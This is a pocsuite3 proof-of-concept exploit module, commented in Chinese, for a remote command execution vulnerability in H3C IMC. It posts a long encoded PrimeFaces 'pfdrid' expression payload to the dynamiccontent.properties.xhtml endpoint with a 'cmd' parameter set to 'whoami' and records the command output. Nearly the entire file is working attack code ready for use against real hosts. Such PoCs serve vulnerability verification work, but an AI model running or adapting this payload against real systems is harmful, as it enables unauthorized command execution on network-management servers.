from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)

class H3CIMCPoc(POCBase):
    vulID = "99254"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "ZorIqz"  # PoC作者的大名
    vulDate = "2021-05-19"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-07-16"  # 编写 PoC 的日期
    updateDate = "2022-07-16"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://mp.weixin.qq.com/s/BP9_H3lpluqIwL5OMIJlIw"]  # 漏洞地址来源,0day不用写
    name = "H3C IMC 远程命令执行漏洞 Poc"  # PoC 名称
    appPowerLink = "https://www.h3c.com/cn/"  # 漏洞厂商主页地址
    appName = "H3C IMC"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，
            执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。
        """  # 漏洞简要描述
    pocDesc = """
            登陆页面-->随便输入账号密码-->点击登录按钮抓包-->进行漏洞复现
        """  # POC用法描述
    cmdRet = ""

    def _check(self):
        # 漏洞验证代码
        url = f"{self.url}/imc/javax.faces.resource/dynamiccontent.properties.xhtml"
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                         "Origin": f"{self.url}", "Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                         "Referer": f"{self.url}/imc/login.jsf", "Accept-Encoding": "gzip, deflate",
                         "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "close"}
        data = {"pfdrt": "sc", "ln": "primefaces",
                      "pfdrid": "uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV/KAe9gtw54DSQCl72JjEAsHTRvxAuJC+/IFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf/cNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv+Eo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c+GvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy+ZLezLj6vK+pVFyKR7s8xN5Ol1tz/G0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM/cwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16/I7eog15OBl4Kco/VjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH+N7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO+Eb/60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF/ciVuZGssKeVT/gR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx/qFUj+DikXHLvbUMrMlNAqSFJpqoy/QywVdBmlVdx+vJelZEK+BwNF9J4p/1fQ8wJZL2LB9SnqxAKr5kdCs0H/vouGHAXJZ+Jzx5gcCw5h6/p3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D/ukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd+LylDFB3dcYIgZtZoaSMAV3pyNoOzHy+1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3+9h0aurkyJVR28jIQlF4nT0nZqpixP/nc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl+zoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH+OwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE+lsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU=",
                      "cmd": "whoami"}
        result = []

        # 一个异常处理 , 生怕站点关闭了 , 请求不到 , 代码报错不能运行
        try:
            res = requests.post(url=url, headers=headers, data=data, verify=False, timeout=9, allow_redirects=False, stream=True)
            # 判断是否存在漏洞
            if res.status_code == 200 and res.text:
                result.append(url)
                self.cmdRet = res.text.strip()
        except Exception as e:
            print(e)
        # 跟 try ... except是一对的 , 最终一定会执行里面的代码 , 不管你是否报错
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.cmdRet
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

# 其他自定义的可添加的功能函数
def other_fuc():
    pass

# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(H3CIMCPoc)
